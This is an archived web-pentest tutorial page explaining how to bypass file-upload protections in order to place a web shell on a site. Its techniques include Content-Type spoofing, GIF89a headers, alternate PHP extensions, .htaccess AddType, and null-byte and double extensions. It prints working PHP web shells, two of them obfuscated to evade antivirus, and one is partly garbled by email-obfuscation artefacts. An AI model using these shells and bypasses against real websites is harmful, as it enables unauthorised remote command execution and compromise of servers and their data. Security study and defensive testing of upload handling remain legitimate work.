 <!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />
<meta name="keywords" content="Security Idiots, Hacking Research Papers, Security Research Papers, Web application Penetration Testing, Web Pentesting, web Injection, SQL Injection, XSS, RFI, LFI, LDAP, XPATH, Bypass, RCE, XML Injection" />
<meta name="description" content="Learn what securities developers use against shell uploading and how can we bypass those securities to get our shell over that website.">
<title>Shell the web - Methods of a Ninja</title>
<link rel="stylesheet" href="../css/skel.css" />
<link rel="stylesheet" href="../css/style.css" />
<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
<script src="../js/jquery.min.js"></script>
<script src="../js/jquery.dropotron.min.js"></script>
<script src="../js/skel.min.js"></script>
<script src="../js/skel-layers.min.js"></script>
<script src="../js/init.js"></script>
<script src="../js/jquery.treeview.js" type="text/javascript"></script>
<script src="../js/jquery.cookie.js" type="text/javascript"></script>
<script src="../js/demo.js" type="text/javascript"></script>
<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
<div id="fb-root"></div>
<script>(function(d, s, id) {
		  var js, fjs = d.getElementsByTagName(s)[0];
		  if (d.getElementById(id)) return;
		  js = d.createElement(s); js.id = id;
		  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=727224234003200&version=v2.0";
		  fjs.parentNode.insertBefore(js, fjs);
		}(document, 'script', 'facebook-jssdk'));

</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-54093058-1', 'auto');
  ga('send', 'pageview');

</script>
<script id="dsq-count-scr" src="https://securityidiots-com.disqus.com/count.js" async></script>
</head>
<body class="left-sidebar"> 
<div id="header">
<div class="container">

<h1><a href="hacking-website-by-shell-uploading.html#" id="logo">Security Idiots</a></h1>

<nav id="nav">
<ul>
<li><a href="../index.html">Home</a></li>
<li>
<a href="hacking-website-by-shell-uploading.html">Categories</a>
<ul>
<li><a href="Information-Gathering/index.html">Information Gathering</a>
<ul>
<li><a href="Information-Gathering/Cloudflare-Bypass/index.html">Cloudflare Bypass</a></li>
</ul>
</li>
<li><a href="SQL-Injection/index.html">SQL Injection</a>
<ul>
<li><a href="SQL-Injection/MSSQL/index.html">MSSQL</a></li>
</ul>
</li>
<li><a href="Tricks/index.html">Tricks</a></li>
<li><a href="XSS/index.html">XSS</a></li>
<li><a href="LFI/index.html">LFI</a></li>
<li><a href="XPATH-Injection/index.html">XPATH Injection</a></li>
</ul>
</li>
<li><a href="https://www.youtube.com/watch?v=nMOyvIWn5Y8&list=PL5e1zp5ChO-S4nlMUy60AMIkB0XDgd8wb" target="_BLANK">Video Gallery</a></li>
<li><a href="../construction.html">The Idiots Team</a></li>
<li><a href="../construction.html">Contact Us</a></li>
</ul>
</nav>
</div>
</div>

<div id="main" class="wrapper style1">
<div class="container">
<div class="row"> 
<div id="sidebar" class="4u sidebar" style="width:25%;background:white;padding:20px;color:black; border: 2px solid #a1a1a1;border-radius: 25px;">
<section>
<header class="major">
<h2>Tutorials Browser</h2>
</header>
<div class="row half">
<ul id="browser" class="filetree">
<li><a href="../Web-Pentest.html"><span class="folder">Web Pentest</span></a><ul id="Web-Pentest"></ul></li>
</ul>
<script>
function SetOpt(type,element,path,title,name){
container = document.getElementById(element);
if(type=='folder')
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span><ul id="'+path+'"></ul></li>';
else
element='<li><span class="'+type+'"><a href="https://www.securityidiots.com/'+path+'" title="'+title+'">'+name+'</a></span></li>';
container.innerHTML = container.innerHTML + element;
}
SetOpt('folder','Web-Pentest','Web-Pentest/Information-Gathering','Information-Gathering','Information-Gathering');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html','Part-0-Purpose-of-Information-Gathering.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html','Part-1-information-Gathering-with-websites.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html','Part-2-information-Gathering-with-Google.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html','Part-3-information-Gathering-with-nmap.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html','Part-4-DNS-information-Gathering-with-DIG.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html','Part-5-information-Gathering-with-Fierce.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html','Part-6-information-Gathering-with-FOCA.html');
SetOpt('file','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html','Part-7-information-Gathering-with-Metagofil.html');
SetOpt('folder','Web-Pentest/Information-Gathering','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Cloudflare-Bypass','Cloudflare-Bypass');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html','Part-1-Understanding-Cloudflare-Security.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html','Part-2-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html','Part-3-Cloudflare-Security-Bypass.html');
SetOpt('file','Web-Pentest/Information-Gathering/Cloudflare-Bypass','Web-Pentest/Information-Gathering/Cloudflare-Bypass/Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html','Part-4-Cloudflare-Security-Bypass.html');
SetOpt('folder','Web-Pentest','Web-Pentest/LFI','LFI','LFI');
SetOpt('file','Web-Pentest/LFI','Web-Pentest/LFI/guide-to-lfi.html','guide-to-lfi.html','guide-to-lfi.html');
SetOpt('folder','Web-Pentest','Web-Pentest/SQL-Injection','SQL-Injection','SQL-Injection');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html','Part-1-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html','Part-2-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html','Part-3-Basic-of-SQL-for-SQLi.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html','Basic-Union-Based-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html','basic-injection-single-line-or-death.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html','XPATH-Error-Based-Injection-Extractvalue.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html','XPATH-Error-Based-Injection-UpdateXML.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html','Error-Based-Injection-Subquery-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/sql-evil-twin-injection.html','sql-evil-twin-injection.html','sql-evil-twin-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Blind-SQL-Injection.html','Blind-SQL-Injection.html','Blind-SQL-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html','bypass-login-using-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html','dump-database-from-login-form-sql.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html','url-spoofed-phishing-with-sqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html','ddos-website-with-sqli-siddos.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/delete-query-injection.html','delete-query-injection.html','delete-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/update-query-injection.html','update-query-injection.html','update-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html','xss-injection-with-sqli-xssqli.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/time-based-blind-injection.html','time-based-blind-injection.html','time-based-blind-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/insert-query-injection.html','insert-query-injection.html','insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html','group-by-and-order-by-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html','Union-based-Oracle-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html','Dump-in-One-Shot-part-1.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html','Dump-in-One-Shot-part-2.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html','DIOS-the-SQL-Injectors-Weapon-Upgraded.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/database-type-testing-sql-injection.html','database-type-testing-sql-injection.html','database-type-testing-sql-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/routed_sql_injection.html','routed_sql_injection.html','routed_sql_injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/multi-query-injection.html','multi-query-injection.html','multi-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-insert-query-injection.html','mssql-insert-query-injection.html','mssql-insert-query-injection.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html','oracle-sql-injection-dios-query.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html','mssql-out-of-band-exploitation.html');
SetOpt('file','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html','addslashes-bypass-sql-injection.html');
SetOpt('folder','Web-Pentest/SQL-Injection','Web-Pentest/SQL-Injection/MSSQL','MSSQL','MSSQL');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/mssql-dios.html','mssql-dios.html','mssql-dios.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html','MSSQL-Union-Based-Injection.html');
SetOpt('file','Web-Pentest/SQL-Injection/MSSQL','Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html','MSSQL-Error-Based-Injection.html');
SetOpt('folder','Web-Pentest','Web-Pentest/Tricks','Tricks','Tricks');
SetOpt('file','Web-Pentest/Tricks','Web-Pentest/Tricks/Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html','Grab-IP-Address-Using-Image.html');
SetOpt('folder','Web-Pentest','Web-Pentest/WAF-Bypass','WAF-Bypass','WAF-Bypass');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html','waf-bypass-guide-part-1.html');
SetOpt('file','Web-Pentest/WAF-Bypass','Web-Pentest/WAF-Bypass/bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html','bypass-sucuri-webSite-firewall.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XPATH-Injection','XPATH-Injection','XPATH-Injection');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html','Basics-of-XPATH-for-XPATH-Injection-part-1.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html','Basics-of-XPATH-for-XPATH-Injection-part-2.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/Basics-XPATH-injection.html','Basics-XPATH-injection.html','Basics-XPATH-injection.html');
SetOpt('file','Web-Pentest/XPATH-Injection','Web-Pentest/XPATH-Injection/xpath-injection-part-1.html','xpath-injection-part-1.html','xpath-injection-part-1.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XSS','XSS','XSS');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss.series-by-securityidiots.html','xss.series-by-securityidiots.html','xss.series-by-securityidiots.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html','basics-of-javascript-for-XSS-part2.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html','basics-of-javascript-for-XSS3-final.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html','xss-exploitation-series-part-1.html');
SetOpt('file','Web-Pentest/XSS','Web-Pentest/XSS/different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html','different-contexts-for-xss-execution.html');
SetOpt('folder','Web-Pentest','Web-Pentest/XXE','XXE','XXE');
SetOpt('file','Web-Pentest/XXE','Web-Pentest/XXE/XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html','XXE-Cheat-Sheet-by-SecurityIdiots.html');

</script> </div>
</section>
</div>  <div id="content" class="8u skel-cell-important">
<section class="lol" style="padding:10px;background:#C9C9C2;color:black; border: 2px solid #a1a1a1;border-radius: 8px;">
<header class="major">
<h3><span class="byline">Shell the web - Methods of a Ninja</span></h3>
<div class="row no-collapse-1">
<span class="post-description" style="text-align:justify;"><img src="../post_images/ninja_shell.png" width=0>In the Name of ALLAH the Most Beneficent and the Merciful<br><br>
Shell uploading is one of the most major attack we can find in a web application. Once an attacker is able to upload his shell he can get complete access to the application as well as database. In this tutorial i wont tell you the basic part of shell uploading but we will discuss some upload securities used and how we can bypass them.<br><br>
Here is the content i am going to discuss in this tutorial.
<br>
<a href="hacking-website-by-shell-uploading.html#clientside-bypass"><span style="color: blue">1. Client side filters Bypass</span></a><br>
<b><li>Disable JavaScript in the browser.<br>
<li>HTTP Live Headers to replay the tampered request.<br>
<li>Tamper data using firefox addon.<br>
<li>Proxify the application and tamper the request.</b><br>
<a href="hacking-website-by-shell-uploading.html#cententtype-varification-bypass"><span style="color: blue">2. Bypassing Content/type Verification</span></a><br>
<b><li>Change Content-Type using Request Modification.<br>
<li>Fool Server side check using GIF89a; header<br>
<li>Inject your payload in Image Metadata/Comment</b><br>
<a href="hacking-website-by-shell-uploading.html#blacklisting-bypass"><span style="color: blue">3. Bypassing the Extension Black Listing</span></a><br>
<b>
<li>Try other executable extensions.<br>
<li>Bypass Case Sensitive Filter.<br>
<li>Idiotic Regex filter bypass.<br>
<li>Add shell to executable using .htaccess file.<br></b>
<a href="hacking-website-by-shell-uploading.html#whitelisting-bypass"><span style="color: blue">4. Bypassing the Extension White Listing</span></a><br>
<b>
<li>Null Byte Injection<br>
<li>Bypass using Double Extension<br>
<li>Invalid Extension Bypass</b><br>
<a href="hacking-website-by-shell-uploading.html#antivirus-bypass"><span style="color: blue">5. Bypassing the Content Length and Malicious script checks</span></a><br>
<b><li>Content Length Bypass<br>
<li>Malicious Script Checks Bypass<br></b>
<a href="https://www.securityidiots.com/Web-Pentest/SQL-Injection/Upload-Shell-using-SQL-Injection.html"><span style="color: blue">6. Upload Shell using SQLi</span></a><br>
<a href="LFI/guide-to-lfi.html"><span style="color: blue">7. Shell Upload Bypass using LFI</span></a><br>
<br>
First of all i hope you know the basics of what a shell is and how to upload a shell and use it, so keeping all that aside we'll concentrate on shell upload bypasses over here:<br><br>
<a name="clientside-bypass">1. Client Side Filters Bypass</a><br><br>
First of all let us be clear what client side filters are?. Client side filters are the filters which are browser based or we can say use javascript to validate the type of file we are uploading. If the file doesnt seems valid then if gives a error. Allright every thing is fine till here, but the problem with such javascript based securities is its too much dependent on browser and an attacker can also tamper the request before if reach the server. Here are some of the tricks an attacker can play to bypass such securities:<br><br><b>
1. Disable JavaScript in the browser.<br>
2. HTTP Live Headers to replay the tampered request.<br>
3. Tamper data using firefox addon.<br>
4. Proxify the application and tamper the request.<br><br></b>
As all of the above are same type of bypass and knowing even one of them will work for you, so i will use the last approach in this tutorial. Its really simple setup BURP proxy with your browser and the game starts. I will show you basic steps to use BURP.<br><br>
Step 1: Open your Burp proxy and make sure its listning to port 8080:<br>
<img src="../post_images/burp_img_listner.png"><br>
Step 2: Configure your Firefox to send the traffic via Localhost port 8080, Goto Tools->Options->Advanced->Network->Settings make the changes shown in the image.<br>
<img src="../post_images/firefox_burp.png">
<br>
You have sucessfully redirected the traffic via BURP. Now goto Proxy->Intercept Tab and turn ON the Interception if off, so that you can change the request content before it reach the server:<br>
<img src="../post_images/burp_interception.png"><br>
Now lets say there is a website where you are trying to upload shell and it shows error, that you can only upload image files, simply rename your shell.php to shell.php.jpg and upload the file. When you will click submit, a request will go from BURP. Change file filename back to shell.php and luckily if there is no check on server side then you will get your shell uploaded.<br><br>
<a name="cententtype-varification-bypass">2. Bypassing Content/type Verification</a><br><br>
<b>
1. Change Content-Type using Request Modification.<br>
2. Fool Server side check using GIF89a; header<br>
3. Inject your payload in Image Metadata/Comment<br><br>
</b>
<b><u>Change Content-Type using Request Modification.</u></b><br>
Many times developer rely on the request "content-Type", the uploading script checks the content-type and if its Image type then only the file is uploaded. The problem here again is the content-Type variable can be changed before it reach the server. As you can see in the Image the content type is "application/octet-stream", change it to "image/gif" and hope that will work for you.<br>
<img src="../post_images/content_type1.png"><br>
<u><b>Fool Server side check using GIF89a; header</b></u><br>
Sometimes server side content signature check can be fooled using "GIF89a;" header in your shell. So heres an example:
<pre>GIF89a;
&lt;?
system($_GET['cmd']);//or you can insert your complete shell code
?&gt;
</pre><br>
<u><b>Inject your payload in Image Metadata/Comments</b></u><br>
Well there are alot of hacks we can do with our image file some of them is injecting the payload into the metadata header using exiftools or you can use a tool named "edjpgcom.exe". Use command line "edjpgcom.exe yourimagefilename.jpg" to add comment to your image.<br><br>
<a name="blacklisting-bypass">3. Bypassing the Extension Black Listing</a><br><br>
Some times developers use black listing approach against the shell uploading, the problem with Black listing approad is always the same which is you always forget to block something or a new bypass may fuck your security. Here also its the same, lets say if a developer is filtering php files from uploading over the server. We have a number of ways to bypass it.<br><br>
<b>
1. Try other executable extensions.<br>
2. Bypass Case Sensitive Filter.<br>
3. Idiotic Regex filter bypass.<br>
4. Add shell to executable using .htaccess file.<br><br></b>
<b><u>Try other executable extensions.</u></b><br>
First we have have multiple php extensions which developer might have forgot so we can rename our file to <span style="color: #ff0000"><b>shell.php1<br>shell.php2<br>shell.php2<br>shell.php4<br>shell.php5<br>shell.phtml</b></span><br>We can even try executing perl shell with an extention <span style="color: #ff0000"><b>.pl or .cgi</b></span>.<br><br>
<b><u>Bypass Case Sensitive Filter.</u></b><br>
If all are nicely blacklisted we can still try changing case to see if the filter is case sensitive or not, in simple words try out:<span style="color: #ff0000"><b><br>shell.PhP<br>shell.Php1<br>shell.PhP2<br>shell.pHP2<br>shell.pHp4<br>shell.PHp5<br>shell.PhtMl</b></span><br><br>
<b><u>Idiotic Regex filter bypass.</u></b><br>
Very few times you can come around a file extention check using regex, such cases might lead to a regex failure. Here the programmer might have made a bad regex which is only checking the presence of ".jpg" in filename, so such cases can be bypassed with using double extention like <span style="color: #ff0000"><b>shell.jpg.php</b></span> and so on.<br><br>
<b><u>Add shell to executable using .htaccess file.</u></b><br>
But if we are fucking unlucky and all the above extensions do not work then we still have one good chance to get a shell over the website using .htaccess file.<br><br>
A htaccess file is the configuration file in Apache server. Using one of its setting we can change the file type behavior. Now lets choose a file extention which is not blacklisted, one of my favorite in such cases is .shell extension. So here is a htaccess configration which you have to cope in a .htaccess file and then upload in the folder and then upload your php shell with a name shell.shell and boom!! it will execute.
<pre>AddType application/x-httpd-php .shell
</pre>
<a name="whitelisting-bypass">4. Bypassing the Extension White Listing</a><br><br>
In some cases developers have used the extension white listing, bypassing such security is usually web server or Language based bypasses. Its a case when developer is not allowing any other extention other than some white listed extensions, such as lets say its a image upload function so only jpg,jpeg,gif,png,bmp etc are only allowed. We can try the following tricks:<br><br>
<b>
1. Null Byte Injection<br>
2. Bypass using Double Extension<br>
3. Invalid Extension Bypass<br><br></b>
<b><u>Null Byte Injection</u></b><br>
Our first trick is Null byte injection where some times when we insert a filename like <span style="color: #ff0000"><b>shell.php%00.jpg</b></span> the part after %00 got nulled by the language and the file gets uploaded with the name shell.php.<br><br>
<b><u>Bypass using Double Extension</u></b><br>
In such cases we can use <span style="color: #ff0000"><b>shell.php.jpg, shell.php:.jpg, shell.php;.jpg</b></span> sometimes it migh lead to shell execution but usually its a webserver or OS based bypass. So we cant really blame the programmer in such cases. But leaving the filenames unchanged is a bad programming practice.<br><br>
<b><u>Invalid Extension Bypass</u></b><br>
Here is another server side exploit, sometimes when we use extentions like .test which is not recognized by the operating system, then the first extension is used, so we can try uploading shell.php.test.<br><br>
<a name="antivirus-bypass">5. Bypassing the Content Length and Malicious script checks</a><br><br>
<b><u>Content Length Bypass</u></b><br>
Sometimes we face a content length check which anyway is not so common, but we know there is no end to human stupidity. Keeping that in mind there are some very easy ways to bypass such checks. If the server is checking for a very small file input then here is the smalles shell code you can use:
<pre>&lt;?system($_GET[0]);
</pre>
Now the next part file size check for bigger files, bypass can be Pumping a file to make it larger, hmmmm i dont think i need to tell you that, its obvious you can insert a lot of junk into your file.<br><br>
<b><u>Malicious script checks Bypass</u></b><br>
Many times we successfully uploads a shell over a server but when we try to access it we finds out its already removed. Thanks usually because of some AV or other scripts checking for malicious files over the server and removing. Now we can deal with such shits easily but i am writing this one for those who dont know to deal with such problems. So here we need some basic knowledge of coding or else some copy/paste may do. Here i am including some shells scripts which works in such situations:<br>
Shell-1: you can execute it like "shell.php?0=system&1=ls"
<pre>&lt;?
@$_[]<a href="../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="1c215c">[email&#160;protected]</a>! _; <a href="../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="d0f48f8fed90">[email&#160;protected]</a>${_}&gt;&gt;$_;$_[]=$__;$_[]<a href="../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="506d10">[email&#160;protected]</a>_;$_[((  $__) ($__   ))].=$_;
$_[]=  $__; $_[]=$_[--$__][$__&gt;&gt;$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
$_[$__ $__] =($_[$__][$__&gt;&gt;$__]).($_[$__][$__]^$_[$__][($__&lt;&lt;$__)-$__] );
$_[$__ $__] .=($_[$__][($__&lt;&lt;$__)-($__/$__)])^($_[$__][$__] );
$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__&lt;&lt;$__)-$__ ];
$_=$ 
$_[$__  $__] ;$_[@-_]($_[@! _] );
?&gt;
</pre>
shell-2: You can execute it like "shell.php?_=system&__=ls"
<pre>&lt;?php
$_=&quot;{&quot;; 
$_=($_^&quot;&lt;&quot;).($_^&quot;&gt;;&quot;).($_^&quot;/&quot;);
?&gt;
&lt;?=${'_'.$_}[&quot;_&quot;](${'_'.$_}[&quot;__&quot;]);?&gt;
</pre>
we can even upload our own php scrips and do some basic operations. You can also use php-reverse-connection shell which comes in handy, and create a reverse connection using netcat.<br><br>
Thats all for this tutorial, will catch you back soon with another tutorial.<br><img src="../post_images/ninja_shell.png" width=0>
<br>Author : Zenodermus Javanicus<br>Date : 2015-02-14</span><br><br></div><div id="disqus_thread"></div>
<script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
var disqus_config = function () {
this.page.url = "http://securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html";  
this.page.identifier = "50";
};

(function() {
var d = document, s = d.createElement('script');
s.src = 'https://securityidiots-com.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> </div>
</header>
</section>
</div>
</div>
</div>
</div>

<div id="footer">
<div class="container">

<div class="row">
<div class="8u">
<section>
<header class="major">
<h2>Connect with Security Idiots</h2>
<span class="byline">Learn & share more on Hacking and Security</span>
</header>
<div class="row">
<section class="6u">
<ul class="default">
<li><a href="https://www.facebook.com/pages/securityidiotscom/879838302049912" target="_BLANK"><img src="hacking-website-by-shell-uploading.html" width=40>&nbsp;&nbsp;<font size=5><b>FACEBOOK</b></font></a></li>
<li><a href="https://www.youtube.com/channel/UCPPAYs04kwfXcHnerm_ueFw" target="_BLANK"><img src="../images/youtube.png" width=40>&nbsp;&nbsp;<font size=5><b>Youtube Channel</b></font></a></li>
</ul>
</section>
</div>
</section>
</div>
<div class="4u">
<section>
<header class="major">
 <h2>Contact Security Idiots</h2>
</header>
<ul class="contact">
<li>
<span class="address">Email</span>
<span><a href="../cdn-cgi/l/email-protection.html" class="__cf_email__" data-cfemail="accdc8c1c5c2ecdfc9cfd9dec5d8d5c5c8c5c3d8df82cfc3c1">[email&#160;protected]</a></span>
</li>
</ul>
</section>
</div>
</div>

<div class="copyright">
Designed by k-hz webdevelopers
</div>
</div>
</div>
<script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>